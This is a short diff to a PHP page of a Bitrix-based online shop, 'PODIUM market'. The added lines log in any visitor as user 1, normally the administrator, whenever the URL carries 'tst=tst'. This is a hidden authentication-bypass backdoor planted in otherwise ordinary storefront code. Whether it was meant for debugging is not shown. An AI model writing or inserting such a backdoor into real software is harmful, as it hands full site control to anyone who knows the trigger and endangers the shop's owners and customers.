@@ -3,6 +3,10 @@ require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
 $APPLICATION->SetTitle("Интернет-магазин PODIUM market");
 ?>
 <?
+if ($_GET["tst"] == "tst") {
+        global $USER;
+        $USER->Authorize(1);
+}
 global  $sFS;
 $sFS = array(
     "!SECTION_ID" => array(
